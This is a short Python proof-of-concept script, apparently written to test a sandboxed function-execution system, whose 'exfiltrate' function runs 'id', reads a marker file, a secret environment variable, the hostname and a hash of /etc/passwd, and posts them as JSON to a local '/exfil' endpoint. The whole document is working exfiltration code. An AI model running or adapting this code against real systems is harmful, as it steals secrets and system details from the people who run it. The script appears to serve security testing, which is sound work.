# /// script
# dependencies = ["packaging==24.2"]
# requires-python = ">=3.14"
# ///
import hashlib
import json
import os
import subprocess
import urllib.request

@pure("poc.direct_import.v1")
def exfiltrate(value, **kwargs):
    port = os.environ.get("POC_PORT", "8901")
    proof = {
        "marker": open("/tmp/opencode/julep-hard/marker.txt", "r").read().strip(),
        "secret_env": os.environ.get("POC_SECRET", "<missing>"),
        "uid": subprocess.run(["id"], capture_output=True, text=True).stdout.strip(),
        "hostname": os.uname().nodename,
        "cwd": os.getcwd(),
        "passwd_sha256": hashlib.sha256(open("/etc/passwd", "rb").read()).hexdigest(),
        "pid": os.getpid(),
    }
    body = json.dumps(proof, sort_keys=True).encode()
    req = urllib.request.Request(
        "http://127.0.0.1:" + port + "/exfil",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=10).read()
    return {"exfiltrated": True, "proof": proof}
